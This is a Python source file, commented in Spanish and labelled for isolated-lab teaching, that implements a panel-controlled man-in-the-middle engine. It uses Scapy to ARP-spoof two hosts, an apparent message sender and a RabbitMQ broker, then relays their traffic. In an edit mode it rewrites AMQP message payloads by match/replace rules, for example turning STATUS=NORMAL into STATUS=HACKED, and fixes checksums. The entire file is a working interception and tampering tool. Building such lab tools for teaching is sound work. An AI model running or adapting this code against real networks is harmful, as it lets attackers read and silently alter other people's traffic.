"""
Motor MITM controlable — SOLO USO EDUCATIVO / LABORATORIO AISLADO.

A diferencia de la versión anterior (reglas quemadas en el código), este motor
expone su estado para que un panel lo controle en caliente:

  - attack_on : prende/apaga el ARP spoofing. Apagado => no vemos nada (el
                tráfico vuelve a ir directo, se restauran las tablas ARP).
  - mode      : "read" (solo observar) | "edit" (aplicar reglas).
  - rules     : lista de {match, replace}. El reemplazo se ajusta a la MISMA
                longitud del match (para no romper el framing TCP/AMQP).
  - stats     : contadores (mensajes vistos / modificados).
  - events    : buffer circular con los últimos mensajes (feed del panel).

El sniff+relay corre siempre en un hilo; solo procesa cuando attack_on está
activo (cuando no, el tráfico ni siquiera llega a nuestra MAC).
"""
import os
import threading
import time
from collections import deque

from scapy.all import (ARP, Ether, IP, TCP, Raw, get_if_hwaddr, getmacbyip,
                       sendp, sniff)


def _fit(match_b: bytes, replace_b: bytes) -> bytes:
    """Ajusta el reemplazo a la longitud exacta del match (trunca o rellena)."""
    n = len(match_b)
    if len(replace_b) >= n:
        return replace_b[:n]
    return replace_b + b" " * (n - len(replace_b))


def _extract_message(load: bytes):
    """Extrae el texto legible del mensaje de la app (empieza en 'msg#')."""
    i = load.find(b"msg#")
    if i < 0:
        return None
    out = bytearray()
    j = i
    while j < len(load) and 32 <= load[j] < 127 and (j - i) < 80:
        out.append(load[j])
        j += 1
    return out.decode("ascii", "replace")


class MITMEngine:
    def __init__(self):
        self.iface = os.environ.get("MITM_IFACE", "eth0")
        self.target_a = os.environ.get("MITM_TARGET_A", "el_enviador")
        self.target_b = os.environ.get("MITM_TARGET_B", "rabbit")
        self.amqp_port = int(os.environ.get("AMQP_PORT", "5672"))

        self.lock = threading.Lock()
        self.attack_on = False
        self.mode = "read"  # "read" | "edit"
        self.rules = [
            {"match": "STATUS=NORMAL", "replace": "STATUS=HACKED"},
            {"match": "note=legit", "replace": "note=pwned"},
        ]
        self.stats = {"seen": 0, "modified": 0}
        self.events = deque(maxlen=100)

        self.ip_a = self.mac_a = self.ip_b = self.mac_b = self.my_mac = None
        self._poison_stop = threading.Event()
        self._poison_thread = None

    # ------------------------------------------------------------------
    # Resolución de víctimas
    # ------------------------------------------------------------------
    def resolve(self, intentos=30):
        import socket
        def _ip(nombre):
            for _ in range(intentos):
                try:
                    return socket.gethostbyname(nombre)
                except socket.gaierror:
                    time.sleep(2)
            raise SystemExit(f"[!] No se pudo resolver {nombre}")

        def _mac(ip):
            for _ in range(intentos):
                m = getmacbyip(ip)
                if m:
                    return m
                time.sleep(2)
            raise SystemExit(f"[!] No se pudo resolver MAC de {ip}")

        self.my_mac = get_if_hwaddr(self.iface)
        self.ip_a, self.ip_b = _ip(self.target_a), _ip(self.target_b)
        self.mac_a, self.mac_b = _mac(self.ip_a), _mac(self.ip_b)
        print(f"[*] {self.target_a}={self.ip_a}/{self.mac_a}  "
              f"{self.target_b}={self.ip_b}/{self.mac_b}  yo={self.my_mac}",
              flush=True)

    # ------------------------------------------------------------------
    # ARP spoofing
    # ------------------------------------------------------------------
    def _arp_reply(self, dst_ip, dst_mac, spoof_ip, spoof_mac):
        sendp(Ether(src=spoof_mac, dst=dst_mac) /
              ARP(op=2, psrc=spoof_ip, hwsrc=spoof_mac, pdst=dst_ip, hwdst=dst_mac),
              iface=self.iface, verbose=0)

    def _poison_loop(self):
        while not self._poison_stop.is_set():
            self._arp_reply(self.ip_a, self.mac_a, self.ip_b, self.my_mac)
            self._arp_reply(self.ip_b, self.mac_b, self.ip_a, self.my_mac)
            self._poison_stop.wait(2)

    def _restore(self):
        for _ in range(5):
            self._arp_reply(self.ip_a, self.mac_a, self.ip_b, self.mac_b)
            self._arp_reply(self.ip_b, self.mac_b, self.ip_a, self.mac_a)
            time.sleep(0.2)

    # ------------------------------------------------------------------
    # Control (lo que llama el panel)
    # ------------------------------------------------------------------
    def start_attack(self):
        with self.lock:
            if self.attack_on:
                return
            self.attack_on = True
        self._poison_stop.clear()
        self._poison_thread = threading.Thread(target=self._poison_loop, daemon=True)
        self._poison_thread.start()
        print("[+] Ataque ON (ARP spoofing activo)", flush=True)

    def stop_attack(self):
        with self.lock:
            if not self.attack_on:
                return
            self.attack_on = False
        self._poison_stop.set()
        if self._poison_thread:
            self._poison_thread.join(timeout=3)
        self._restore()
        print("[-] Ataque OFF (tablas ARP restauradas)", flush=True)

    def set_mode(self, mode):
        if mode not in ("read", "edit"):
            raise ValueError("modo inválido")
        with self.lock:
            self.mode = mode

    def set_rules(self, rules):
        limpio = []
        for r in rules:
            m = str(r.get("match", "")).strip()
            rep = str(r.get("replace", ""))
            if not m:
                continue
            efectivo = _fit(m.encode(), rep.encode()).decode("ascii", "replace")
            limpio.append({"match": m, "replace": rep, "effective": efectivo})
        with self.lock:
            self.rules = limpio

    def status(self):
        with self.lock:
            return {
                "attack_on": self.attack_on,
                "mode": self.mode,
                "rules": self.rules,
                "stats": dict(self.stats),
                "targets": {"a": f"{self.target_a} ({self.ip_a})",
                            "b": f"{self.target_b} ({self.ip_b})"},
            }

    def recent_events(self, n=50):
        with self.lock:
            return list(self.events)[:n]

    # ------------------------------------------------------------------
    # Sniff + relay (siempre corriendo; procesa solo si attack_on)
    # ------------------------------------------------------------------
    def _relevant(self, p):
        return (self.attack_on and Ether in p
                and p[Ether].dst == self.my_mac
                and p[Ether].src in (self.mac_a, self.mac_b))

    def _apply_rules(self, load, rules):
        nuevo = load
        for r in rules:
            mb = r["match"].encode()
            if mb in nuevo:
                nuevo = nuevo.replace(mb, _fit(mb, r["replace"].encode()))
        return nuevo

    def _process(self, p):
        src = p[Ether].src
        dst_mac = self.mac_b if src == self.mac_a else self.mac_a

        if p.haslayer(Raw) and p.haslayer(TCP):
            load = bytes(p[Raw].load)
            msg = _extract_message(load)
            if msg is not None:
                with self.lock:
                    mode, rules = self.mode, list(self.rules)
                tampered = False
                if mode == "edit":
                    nuevo = self._apply_rules(load, rules)
                    if nuevo != load:
                        p[Raw].load = nuevo
                        del p[IP].len, p[IP].chksum, p[TCP].chksum
                        tampered = True
                final_msg = _extract_message(bytes(p[Raw].load)) if tampered else None
                with self.lock:
                    self.stats["seen"] += 1
                    if tampered:
                        self.stats["modified"] += 1
                    self.events.appendleft({
                        "ts": time.strftime("%H:%M:%S"),
                        "original": msg,
                        "modified": final_msg,
                        "tampered": tampered,
                    })
                print((f"💥 {msg}  ->  {final_msg}" if tampered
                       else f"👀 {msg}"), flush=True)

        p[Ether].src = self.my_mac
        p[Ether].dst = dst_mac
        try:
            sendp(p, iface=self.iface, verbose=0)
        except Exception as e:  # noqa: BLE001
            print(f"[!] relay error: {e}", flush=True)

    def start_sniffer(self):
        t = threading.Thread(
            target=lambda: sniff(iface=self.iface, lfilter=self._relevant,
                                 prn=self._process, store=0),
            daemon=True)
        t.start()
        print(f"[*] Sniffer escuchando en {self.iface}", flush=True)
